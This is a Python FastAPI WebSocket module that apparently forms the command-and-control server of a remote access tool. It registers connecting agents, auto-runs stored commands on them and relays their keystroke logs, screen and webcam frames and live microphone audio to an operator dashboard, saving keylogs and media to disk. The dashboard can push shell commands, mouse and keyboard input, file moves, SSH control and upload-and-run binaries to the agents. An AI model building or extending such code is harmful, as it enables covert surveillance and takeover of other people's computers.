from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from agent_manager import manager
import json
from auth import verify_token
import httpx
import os
import json
import base64
import uuid
import datetime as dt
from db import get_session
from models import EventFile
import time

router = APIRouter()

MEDIA_ROOT = os.getenv("MEDIA_ROOT", os.path.join(os.path.dirname(__file__), 'media'))
# Frame persistence controls (disable storing streaming frames by default to reduce I/O latency)
STORE_SCREEN_FRAMES = str(os.getenv("STORE_SCREEN_FRAMES", "0")).strip().lower() in ("1","true","yes","on")
STORE_CAMERA_FRAMES = str(os.getenv("STORE_CAMERA_FRAMES", "0")).strip().lower() in ("1","true","yes","on")
SCREEN_STORE_MIN_MS = int(str(os.getenv("SCREEN_STORE_MIN_MS", "0")).strip() or "0")
CAMERA_STORE_MIN_MS = int(str(os.getenv("CAMERA_STORE_MIN_MS", "0")).strip() or "0")
_last_store_ts = {"screen": {}, "camera": {}}  # type: ignore[var-annotated]

async def _store_media_event(kind: str, agent_id: str, frame: dict):
    # frame: {data: data_url, w?: int, h?: int}
    durl = frame.get('data') or ''
    if not (isinstance(durl, str) and durl.startswith('data:')):
        return
    try:
        header, b64 = durl.split(';base64,', 1)
    except ValueError:
        return
    mime = header[5:] if header.startswith('data:') else 'application/octet-stream'
    # Decide extension by mime
    ext = 'bin'
    if 'png' in mime:
        ext = 'png'
    elif 'jpeg' in mime or 'jpg' in mime:
        ext = 'jpg'
    elif 'webm' in mime:
        ext = 'webm'
    elif 'wav' in mime:
        ext = 'wav'
    elif 'mp3' in mime:
        ext = 'mp3'
    elif 'ogg' in mime:
        ext = 'ogg'
    now = dt.datetime.utcnow()
    sub = now.strftime('%Y%m')
    out_dir = os.path.join(MEDIA_ROOT, kind, sub)
    os.makedirs(out_dir, exist_ok=True)
    fname = f"{uuid.uuid4().hex}.{ext}"
    raw = base64.b64decode(b64, validate=False)
    path = os.path.join(out_dir, fname)
    with open(path, 'wb') as f:
        f.write(raw)
    rel = os.path.relpath(path, MEDIA_ROOT).replace('\\', '/')
    storage_url = f"/media/{rel}"
    async with await get_session() as s:
        rec = EventFile(
            id=uuid.uuid4(),
            ts=dt.datetime.utcnow(),
            agent_id=agent_id,
            kind=kind,
            storage_url=storage_url,
            size_bytes=len(raw),
            width=int(frame.get('w') or 0) or None,
            height=int(frame.get('h') or 0) or None,
            note=None,
        )
        s.add(rec)
        await s.commit()

async def _store_keylog_event(agent_id: str, line: str):
    # Store as a small text file snapshot
    if not isinstance(line, str) or not line:
        return
    now = dt.datetime.utcnow()
    sub = now.strftime('%Y%m')
    out_dir = os.path.join(MEDIA_ROOT, 'keylog', sub)
    os.makedirs(out_dir, exist_ok=True)
    fname = f"{uuid.uuid4().hex}.txt"
    path = os.path.join(out_dir, fname)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(line)
    rel = os.path.relpath(path, MEDIA_ROOT).replace('\\', '/')
    storage_url = f"/media/{rel}"
    async with await get_session() as s:
        rec = EventFile(
            id=uuid.uuid4(),
            ts=dt.datetime.utcnow(),
            agent_id=agent_id,
            kind='keylog',
            storage_url=storage_url,
            size_bytes=os.path.getsize(path),
            width=None,
            height=None,
            note=None,
        )
        s.add(rec)
        await s.commit()

@router.websocket('/ws/agent')
async def ws_agent(ws: WebSocket):
    await ws.accept()
    agent_id = None
    try:
        # Expect handshake message with agent_id and agent_name
        init = await ws.receive_text()
        try:
            info = json.loads(init)
        except Exception:
            info = {}
        agent_id = info.get('agent_id') or 'unknown-agent'
        agent_name = info.get('agent_name') or agent_id
        http_base = info.get('http_base') or 'http://localhost:8000'
        has_camera = bool(info.get('has_camera'))
        # Prefer agent-provided geo; fallback to server-side lookup
        country = info.get('country')
        country_code = info.get('country_code')
        # Reject if blacklisted
        if await manager.is_blacklisted(agent_id):
            await ws.close()
            return
        if not country or not country_code:
            try:
                xff = ws.headers.get('x-forwarded-for') if hasattr(ws, 'headers') else None
                ip = (xff.split(',')[0].strip() if xff else None) or (ws.client.host if ws.client else None)
                if ip and ip not in ('127.0.0.1','::1'):
                    async with httpx.AsyncClient(timeout=4.0) as client:
                        r = await client.get(f'https://ipwho.is/{ip}')
                        if r.status_code == 200:
                            d = r.json()
                            if d.get('success') is not False:
                                country = country or d.get('country')
                                country_code = country_code or d.get('country_code')
            except Exception:
                pass
        await manager.register_agent(agent_id, agent_name, http_base, ws, has_camera, country, country_code)

        # Optional: auto-run commands when agent connects (from stored config)
        try:
            ar_path = os.path.join(os.path.dirname(__file__), 'config', 'autorun.json')
            cmds = []
            try:
                with open(ar_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                if isinstance(data, list):
                    cmds = data
            except Exception:
                cmds = []
            for it in cmds:
                if not isinstance(it, dict):
                    continue
                if it.get('enabled') is False:
                    continue
                cmd = (it.get('command') or '').strip()
                mode = (it.get('mode') or 'interactive').strip().lower()
                if not cmd:
                    continue
                if mode in ('interactive', 'tty', 'terminal', ''):
                    await ws.send_json({"type": "start_interactive", "command": cmd})
                else:
                    await ws.send_json({"command": cmd})
        except Exception:
            pass

        # Stream messages from agent to dashboards
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {"output": msg}

            # Handle agent RPC responses (e.g., stats)
            if isinstance(data, dict) and data.get('type') == 'stats_response':
                req_id = data.get('request_id')
                payload = data.get('data') if 'data' in data else {"error": data.get('error', 'Unknown error')}
                await manager.complete_stats_request(req_id, payload)
                continue

            # Handle typed streaming events first to avoid mis-routing
            if data.get('type') == 'screen_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_screen_to_dashboards(agent_id, frame)
                # Optional: store at most every SCREEN_STORE_MIN_MS when enabled (defaults disabled)
                try:
                    if STORE_SCREEN_FRAMES:
                        now_ms = int(time.time() * 1000)
                        prev = int(_last_store_ts['screen'].get(agent_id, 0) or 0)
                        if SCREEN_STORE_MIN_MS <= 0 or (now_ms - prev) >= SCREEN_STORE_MIN_MS:
                            await _store_media_event('screen_image', agent_id, frame)
                            _last_store_ts['screen'][agent_id] = now_ms
                except Exception:
                    pass
            elif data.get('type') == 'camera_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_camera_to_dashboards(agent_id, frame)
                # Optional: store at most every CAMERA_STORE_MIN_MS when enabled (defaults disabled)
                try:
                    if STORE_CAMERA_FRAMES:
                        now_ms = int(time.time() * 1000)
                        prev = int(_last_store_ts['camera'].get(agent_id, 0) or 0)
                        if CAMERA_STORE_MIN_MS <= 0 or (now_ms - prev) >= CAMERA_STORE_MIN_MS:
                            await _store_media_event('camera_image', agent_id, frame)
                            _last_store_ts['camera'][agent_id] = now_ms
                except Exception:
                    pass
            elif data.get('type') == 'keylog_line':
                await manager.relay_keylog_to_dashboards(agent_id, str(data.get('line','')))
                # Optional: store keylog snapshot as text file
                try:
                    await _store_keylog_event(agent_id, str(data.get('line','')))
                except Exception:
                    pass
            elif 'output' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['output']))
            elif 'line' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['line']))
            elif 'exit_code' in data:
                await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
            elif data.get('type') == 'audio_segment':
                # Persist audio clip under 'audio' kind
                try:
                    await _store_media_event('audio', agent_id, data)
                except Exception:
                    pass
                # Optionally notify dashboards
                await manager.relay_output_to_dashboards(agent_id, '[audio saved]\n')
            elif data.get('type') == 'audio_live':
                # Relay live audio chunks to dashboards (not persisted)
                try:
                    payload = {k: data[k] for k in ('pcm_b64','rate','ch','ts') if k in data}
                except Exception:
                    payload = {"pcm_b64": str(data.get('pcm_b64') or data.get('data') or '')}
                await manager.relay_audio_live_to_dashboards(agent_id, payload)
            elif data.get('type') == 'download_response':
                # Complete pending download request for admin HTTP route
                try:
                    await manager.complete_download_request(str(data.get('request_id') or ''), data)
                except Exception:
                    pass
            elif 'error' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['error']))
            else:
                # Unrecognized; forward raw
                await manager.relay_output_to_dashboards(agent_id, msg)

    except WebSocketDisconnect:
        pass
    finally:
        if agent_id:
            await manager.mark_offline(agent_id)

@router.websocket('/ws/dashboard')
async def ws_dashboard(ws: WebSocket):
    # Require auth token in query string
    token = ws.query_params.get('token')
    if not token or not verify_token(token):
        # Policy violation
        await ws.close(code=1008)
        return

    await ws.accept()
    await manager.register_dashboard(ws)
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {}
            target = data.get('target')
            if target and 'command' in data:
                # If session_id is present, keep JSON so agent can route per-pane; else send plain text
                if isinstance(data.get('session_id'), str):
                    ok = await manager.forward_json(target, data)
                else:
                    command = data.get('command')
                    ok = await manager.forward_command(target, command)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
            elif target and data.get('type') in (
                'start_interactive','stdin','end_interactive',
                'screen_start','screen_stop','mouse','keyboard',
                'camera_start','camera_stop','queue_reset','hard_reset','disconnect',
                'keylog_start','keylog_stop','wallpaper_set','fs_copy','fs_move',
                'masters_list','masters_add','masters_update','masters_delete','masters_reconnect',
                # audio control & intercom
'audio_start','audio_stop','audio_play_path','audio_play_data',
                'audio_listen_start','audio_listen_stop',
'intercom_start','intercom_chunk','intercom_stop','intercom_mute',
                # file upload via WS
                'upload_data',
                # temp execute binary/script (upload & run)
                'run_temp',
                # stop all on agent
                'stop_all',
                # ssh control
                'ssh_stop','ssh_start'
            ):
                ok = await manager.forward_json(target, data)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
    except WebSocketDisconnect:
        pass
    finally:
        # Remove from dashboard set
        try:
            await manager.remove_dashboard(ws)
        except Exception:
            pass
